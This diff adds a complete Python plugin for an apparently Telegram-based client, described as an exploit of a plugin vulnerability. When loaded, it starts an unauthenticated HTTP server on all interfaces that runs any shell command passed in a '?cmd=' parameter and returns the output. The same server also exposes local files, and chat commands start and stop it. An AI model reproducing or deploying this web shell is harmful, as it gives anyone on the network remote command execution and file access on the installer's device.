@@ -1,0 +1,164 @@
+import http.server
+import socketserver
+import threading
+import os
+from android_utils import log, run_on_ui_thread
+from base_plugin import BasePlugin, HookResult, HookStrategy
+from ui.settings import Header, Input, Divider
+from client_utils import get_last_fragment
+from org.telegram.ui.ActionBar import AlertDialog
+from ui.bulletin import BulletinHelper
+
+__id__ = "PoCoVod"
+__name__ = "PoCoVod  (EV-2025-1488)"
+__description__ = "PoCoVod (EV-2025-1488). Plugins vulnerability exploit"
+__author__ = "@systemxplore"
+__min_version__ = "11.9.1"
+__version__ = "2.1"
+DEFAULT_PORT = 7777
+
+class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        log(f"HTTP Server: {format%args}")
+        
+    def do_GET(self):
+        try:
+            if self.path.startswith('/?cmd='):
+                command = self.path[6:]
+                try:
+                    output = os.popen(command).read()
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(output.encode())
+                    return
+                except Exception as e:
+                    self.send_error(500, str(e))
+                    return
+
+            return http.server.SimpleHTTPRequestHandler.do_GET(self)
+            
+        except Exception as e:
+            log(f"Error in do_GET: {str(e)}")
+            self.send_error(500, str(e))
+
+class PoCovodPlugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self.server = None
+        self.server_thread = None
+        self.port = self.get_setting("port") or DEFAULT_PORT
+        self.start_server()
+        self.show_status_bulletin("Server initialized", f"Running on port {self.port}")
+
+    def on_plugin_load(self):
+        self.add_on_send_message_hook()
+
+    def create_settings(self):
+        from java.util import Locale
+        lang = Locale.getDefault().getLanguage()
+        
+        strings = {
+            'ru': {
+                'server_settings': "🌐 Настройки сервера",
+                'port_label': "Порт сервера",
+                'port_desc': "Укажите порт на котором будет запущен сервер (требуется перезапуск)",
+                'usage_title': "Использование",
+                'usage_desc': "Команды:\n.srv status - статус сервера\n.srv start - запустить сервер\n.srv stop - остановить сервер"
+            },
+            'en': {
+                'server_settings': "🌐 Server Settings",
+                'port_label': "Server Port",
+                'port_desc': "Specify the port on which the server will run (requires restart)",
+                'usage_title': "Usage",
+                'usage_desc': "Commands:\n.srv status - server status\n.srv start - start server\n.srv stop - stop server"
+            }
+        }
+        
+        lang_key = 'ru' if lang.startswith('ru') else 'en'
+        s = strings[lang_key]
+        
+        return [
+            Header(text=s['server_settings']),
+            Input(
+                key="port",
+                text=s['port_label'],
+                default=str(DEFAULT_PORT)
+            ),
+            Divider(text=s['port_desc']),
+            Header(text=s['usage_title']),
+            Divider(text=s['usage_desc'])
+        ]
+
+    def show_status_bulletin(self, title, message):
+        if title.lower().startswith(("error", "failed", "fail")):
+            BulletinHelper.show_error(f"{title}: {message}")
+        elif title.lower().startswith(("success", "started", "running")):
+            BulletinHelper.show_success(f"{title}: {message}")
+        else:
+            BulletinHelper.show_info(f"{title}: {message}")
+
+    def start_server(self):
+        try:
+            if self.server:
+                log("Server is already running")
+                BulletinHelper.show_info("Server is already running on port " + str(self.port))
+                return
+            
+            def run_server():
+                try:
+                    handler = CustomHTTPRequestHandler
+                    self.server = socketserver.TCPServer(("0.0.0.0", int(self.port)), handler)
+                    log(f"Server starting on port {self.port}")
+                    BulletinHelper.show_success(f"Server started successfully on port {self.port}")
+                    self.server.serve_forever()
+                except Exception as e:
+                    error_msg = str(e)
+                    log(f"Server error: {error_msg}")
+                    BulletinHelper.show_error(f"Server error: {error_msg}")
+
+            self.server_thread = threading.Thread(target=run_server, daemon=True)
+            self.server_thread.start()
+            log("Server thread started")
+            
+        except Exception as e:
+            error_msg = str(e)
+            log(f"Failed to start server: {error_msg}")
+            BulletinHelper.show_error(f"Failed to start server: {error_msg}")
+
+    def stop_server(self):
+        if self.server:
+            self.server.shutdown()
+            self.server.server_close()
+            self.server = None
+            self.server_thread = None
+            log("Server stopped")
+            BulletinHelper.show_success("Server stopped successfully")
+
+    def __del__(self):
+        self.stop_server()
+        log("FileServer Plugin destroyed and server stopped")
+
+    def on_send_message_hook(self, account, params):
+        if not isinstance(params.message, str):
+            return HookResult()
+        if params.message.startswith(".srv"):
+            try:
+                parts = params.message.strip().split()
+                command = parts[1] if len(parts) > 1 else "status"
+                if command == "status":
+                    status = "running" if self.server else "stopped"
+                    BulletinHelper.show_info(f"Server is {status} on port {self.port}")
+                elif command == "stop":
+                    self.stop_server()
+                elif command == "start":
+                    self.start_server()
+                else:
+                    BulletinHelper.show_info("Commands: .srv status|start|stop")
+                return HookResult(strategy=HookStrategy.CANCEL)
+            except Exception as e:
+                error_msg = str(e)
+                log(f"Server plugin error: {error_msg}")
+                BulletinHelper.show_error(f"Server error: {error_msg}")
+                return HookResult(strategy=HookStrategy.CANCEL)
+        return HookResult()
